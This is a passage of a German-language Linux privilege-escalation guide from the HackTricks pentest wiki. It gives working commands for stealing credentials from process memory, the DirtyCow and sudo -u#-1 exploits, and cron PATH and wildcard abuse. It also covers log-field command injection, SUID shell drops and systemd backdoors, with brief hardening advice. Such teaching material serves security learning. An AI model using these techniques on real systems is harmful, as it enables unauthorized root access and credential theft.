# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Beginnen wir damit, Informationen über das laufende Betriebssystem zu sammeln
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du **Schreibrechte für ein Verzeichnis innerhalb der `PATH`-Variable** hast, kannst du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API keys in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen Exploit gibt, der zur Privilegieneskalation verwendet werden kann.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** findest: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Seite zu extrahieren, kannst du:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Always **Suche immer die Kernel-Version in Google**, vielleicht ist deine Kernel-Version bereits in einem Kernel exploit angegeben; dann kannst du sicher sein, dass dieser exploit gültig ist.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Basierend auf den verwundbaren sudo-Versionen, die in erscheinen:
```bash
searchsploit sudo
```
Sie können mit diesem grep prüfen, ob die sudo-Version verwundbar ist.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben lokalen, nicht-privilegierten Benutzern, ihre Privilegien zu root zu eskalieren über die sudo `--chroot`-Option, wenn die Datei `/etc/nsswitch.conf` aus einem von einem Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [vulnerability] auszunutzen. Bevor du den Exploit ausführst, stelle sicher, dass deine `sudo`-Version verwundbar ist und die `chroot`-Funktion unterstützt.

Für weitere Informationen siehe die ursprüngliche [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturüberprüfung fehlgeschlagen

Sieh dir **smasher2 box of HTB** für ein **Beispiel** an, wie diese vuln ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Überprüfe **what is mounted and unmounted**, wo und warum. Falls etwas unmounted ist, könntest du versuchen, es zu mounten und nach privaten Daten zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, falls du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Prüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine ältere Nagios-Version (zum Beispiel), die zur Privilegieneskalation ausgenutzt werden könnte…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, könntest du auch **openVAS** verwenden, um nach veralteter und anfälliger Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind. Daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob installierte Softwareversionen anfällig für bekannte exploits sind._

## Prozesse

Sieh dir an, welche **Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat, als er haben sollte** (vielleicht wird ein tomcat von root ausgeführt?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **credentials im Klartext im Speicher**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist dies meist nützlicher, wenn du bereits root bist und weitere credentials entdecken willst.\
Denke jedoch daran, dass **du als normaler Benutzer den Speicher der Prozesse, die dir gehören, lesen kannst**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Maschinen **ptrace standardmäßig nicht erlauben**, was bedeutet, dass du Prozesse, die anderen Benutzern gehören, nicht auslesen kannst.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie dieselbe uid haben. Das ist die klassische Funktionsweise von ptrace.
> - **kernel.yama.ptrace_scope = 1**: Es kann nur ein übergeordneter Prozess debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur Admins können ptrace verwenden, da dafür die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace nachverfolgt werden. Sobald gesetzt, ist ein Reboot nötig, um ptracing wieder zu aktivieren.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps zeigen, wie Speicher innerhalb dieses Prozesses gemappt ist** des virtuellen Adressraums; sie zeigen auch die **Berechtigungen jeder gemappten Region**. Die **mem** Pseudo-Datei **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir nutzen diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Bereiche in eine Datei zu dumpen**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über /dev/kmem angesprochen werden.\
Typischerweise ist `/dev/mem` nur von **root** und der **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für linux

ProcDump ist eine für Linux neu gedachte Version des klassischen ProcDump-Tools aus der Sysinternals-Toolsuite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, kannst du Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst manuell die root-Rechte entfernen und den Prozess dumpen, der dir gehört
- Script A.5 von [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Credentials aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn du feststellst, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe frühere Abschnitte, um verschiedene Möglichkeiten zu finden, den Speicher eines Prozesses zu dumpen) und nach Zugangsdaten im Speicher suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldedaten aus dem Speicher stehlen** und aus einigen **wohlbekannten Dateien**. Es benötigt Root-Rechte, um ordnungsgemäß zu funktionieren.

| Funktion                                           | Prozessname         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic Auth-Sessions)         | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – web-basierter Scheduler privesc

Wenn eine Web-„Crontab UI“-Konsole (alseambusher/crontab-ui) als root läuft und nur an Loopback gebunden ist, kannst du sie trotzdem über SSH local port-forwarding erreichen und einen privilegierten Job anlegen, um zu eskalieren.

Typical chain
- Loopback-only Port entdecken (z. B. 127.0.0.1:8000) und Basic-Auth-Realm via `ss -ntlp` / `curl -v localhost:8000`
- Credentials in operational artifacts finden:
  - Backups/Skripte mit `zip -P <password>`
  - systemd unit mit gesetzten `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel aufbauen und einloggen:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen hoch-privilegierten Job und führe ihn sofort aus (legt eine SUID shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwenden Sie es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Crontab UI nicht als root ausführen; auf einen dedizierten Benutzer mit minimalen Berechtigungen beschränken
- An localhost binden und zusätzlich den Zugang über Firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Vermeiden Sie, secrets in unit files einzubetten; verwenden Sie secret stores oder ein nur für root lesbares EnvironmentFile
- Audit/Logging für on-demand Jobausführungen aktivieren

Prüfen Sie, ob ein geplanter Job verwundbar ist. Vielleicht können Sie ein von root ausgeführtes Script ausnutzen (wildcard vuln? Dateien ändern, die root verwendet? symlinks verwenden? bestimmte Dateien in dem Verzeichnis anlegen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in dieser crontab der root-Benutzer versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du dir eine root-Shell verschaffen, indem du Folgendes ausführst:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Skript, das ein Wildcard verwendet (Wildcard Injection)

Wenn ein Skript, das als root ausgeführt wird, ein “**\***” in einem Befehl enthält, kannst du dies ausnutzen, um unerwartete Dinge zu bewirken (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das wildcard einem Pfad wie** _**/some/path/\***_ **vorausgeht, ist es nicht verwundbar (auch** _**./\***_ **nicht).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Warum es funktioniert: In Bash erfolgen Expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird also zuerst substituiert (der Befehl wird ausgeführt), danach wird die verbleibende numerische `0` für die arithmetic verwendet, sodass das Script ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Ausnutzung: Sorge dafür, dass von einem Angreifer kontrollierter Text in das geparste Log geschrieben wird, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite die Ausgabe um), damit die arithmetic gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte Script ein **Verzeichnis, auf das du vollen Zugriff hast**, verwendet, kann es sinnvoll sein, dieses Verzeichnis zu löschen und einen **symlink-Ordner zu einem anderen** zu erstellen, der ein von dir kontrolliertes Script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-Validierung und sicherere Datei­behandlung

Beim Überprüfen von privilegierten Skripten/Binaries, die Dateien per Pfad lesen oder schreiben, vergewissern Sie sich, wie Links behandelt werden:

- `stat()` folgt einem symlink und gibt die Metadaten des Ziels zurück.
- `lstat()` gibt die Metadaten des symlinks selbst zurück.
- `readlink -f` und `namei -l` helfen, das endgültige Ziel aufzulösen und die Berechtigungen jeder Pfadkomponente anzuzeigen.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Für Defender/Developer sind sichere Muster gegen symlink tricks unter anderem:

- `O_EXCL` mit `O_CREAT`: schlägt fehl, wenn der Pfad bereits existiert (verhindert vom Angreifer vorerstellte Links/Dateien).
- `openat()`: arbeitet relativ zu einem vertrauenswürdigen Verzeichnis-File-Descriptor.
- `mkstemp()`: erstellt temporäre Dateien atomar mit sicheren Berechtigungen.

### Custom-signed cron binaries with writable payloads
Blue-Teams "signen" manchmal cron-gesteuerte Binärdateien, indem sie einen custom ELF-Abschnitt dumpen und nach einem Vendor-String greppen, bevor sie sie als root ausführen. Wenn diese Binärdatei group-writable ist (z. B. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) und du das signing-Material leakst, kannst du den Abschnitt fälschen und die cron-Task hijacken:

1. Verwende `pspy`, um den Verifizierungsablauf zu erfassen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` aus, gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` und hat dann die Datei ausgeführt.
2. Erstelle das erwartete Zertifikat mit dem geleakten Key/Config neu (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Baue einen bösartigen Ersatz (z. B. droppe einen SUID bash, füge deinen SSH key hinzu) und bette das Zertifikat in `.text_sig` ein, sodass der grep erfolgreich ist:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe die geplante Binärdatei, dabei die Execute-Bits erhalten:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Lauf; sobald die naive Signaturprüfung besteht, läuft dein Payload als root.

### Frequent cron jobs

Du kannst die Prozesse überwachen, um Prozesse zu finden, die alle 1, 2 oder 5 Minuten ausgeführt werden. Möglicherweise kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0,1s für 1 Minute zu überwachen**, **nach seltener ausgeführten Befehlen zu sortieren** und die Befehle zu entfernen, die am häufigsten ausgeführt wurden, kannst du:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden gestarteten Prozess).

### Root-Backups, die vom Angreifer gesetzte Mode-Bits erhalten (pg_basebackup)

Wenn ein root-owned cron `pg_basebackup` (oder eine beliebige rekursive Kopie) für ein Datenbankverzeichnis ausführt, in das du schreiben kannst, kannst du ein **SUID/SGID binary** platzieren, das mit denselben Mode-Bits als **root:root** in die Backup-Ausgabe zurückkopiert wird.

Typischer Entdeckungsablauf (als niedrig privilegierter DB-Benutzer):
- Verwende `pspy`, um einen root cron zu entdecken, der etwa `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` jede Minute aufruft.
- Bestätige, dass der Quell-Cluster (z. B. `/var/lib/postgresql/14/main`) von dir beschreibbar ist und dass das Ziel (`/opt/backups/current`) nach dem Job root gehört.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Das funktioniert, weil `pg_basebackup` die Dateimodus-Bits beim Kopieren des Clusters beibehält; wenn es von root aufgerufen wird, erben die Zieldateien **root-Eigentum + vom Angreifer gewählte SUID/SGID**. Jede ähnliche privilegierte Backup-/Kopierroutine, die Berechtigungen beibehält und in einen ausführbaren Pfad schreibt, ist verwundbar.

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen Wagenrücklauf nach einem Kommentar setzt** (ohne Zeilenumbruchzeichen), und der cronjob wird funktionieren. Beispiel (beachte das Wagenrücklauf-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Prüfe, ob du eine `.service` Datei schreiben kannst; wenn ja, **könntest du sie ändern**, sodass sie deinen **backdoor** **ausführt**, **wenn** der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gestartet wird).\
Zum Beispiel erstelle deine backdoor innerhalb der .service Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Service-Binaries

Beachte, dass wenn du **Schreibrechte an Binärdateien hast, die von Services ausgeführt werden**, du sie für backdoors verändern kannst, sodass beim erneuten Ausführen der Services die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit dem folgenden Befehl sehen:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **write** kannst, könntest du möglicherweise **escalate privileges**. Du musst nach **relative paths being used on service configurations** suchen, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann ein **executable** mit dem **same name as the relative path binary** im systemd PATH-Ordner, den du beschreiben kannst. Wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird dein **backdoor** ausgeführt (nicht-privilegierte Benutzer können Dienste normalerweise nicht starten/stoppen — prüfe aber, ob du `sudo -l` verwenden kannst).

**Mehr über Dienste erfährst du mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd unit files, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Events steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für calendar time events und monotonic time events bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn Sie einen Timer ändern können, können Sie ihn dazu bringen, einige existierende systemd.unit-Einheiten auszuführen (z. B. eine `.service`- oder `.target`-Einheit).
```bash
Unit=backdoor.service
```
In der Dokumentation steht, was die Unit ist:

> Die Unit, die beim Ablauf dieses Timers aktiviert wird. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, ist dieser Wert standardmäßig ein service, der denselben Namen wie die Timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der Timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müssten Sie, um diese Berechtigung auszunutzen:

- Finden Sie eine systemd Unit (wie eine `.service`), die ein schreibbares Binary ausführt
- Finden Sie eine systemd Unit, die einen relativen Pfad ausführt und auf dessen systemd PATH Sie Schreibrechte haben (um sich als dieses ausführbare Programm auszugeben)

**Mehr über Timer in `man systemd.timer` erfahren.**

### **Timer aktivieren**

Um einen Timer zu aktivieren benötigen Sie root-Rechte und müssen ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch Erstellen eines Symlinks zu ihm unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf derselben oder auf unterschiedlichen Maschinen innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Deskriptordateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können über `.socket`-Dateien konfiguriert werden.

**Mehr über sockets mit `man systemd.socket` erfahren.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammenfassend geben sie **an, wo auf den Socket gehört wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6- und/oder Portnummer, auf die gehört wird, usw.).
- `Accept`: Nimmt ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz erzeugt** und ihr wird nur der Verbindungs-Socket übergeben. Wenn **false**, werden alle Listening-Sockets selbst an die gestartete Service-Unit **übergeben**, und es wird nur eine Service-Unit für alle Verbindungen erzeugt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Service-Unit bedingungslos den gesamten eingehenden Traffic verarbeitet. **Standardwert ist false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **vor** bzw. **nach** dem Erstellen und Binden der listening **sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** bzw. **nach** dem Schließen und Entfernen der listening **sockets**/FIFOs **ausgeführt** werden.
- `Service`: Gibt den Namen der **service**-Unit an, die bei **eingehendem Traffic** aktiviert werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Sie verwendet standardmäßig die Service-Unit mit demselben Namen wie der Socket (Suffix ersetzt). In den meisten Fällen ist es nicht nötig, diese Option zu verwenden.

### Beschreibbare .socket-Dateien

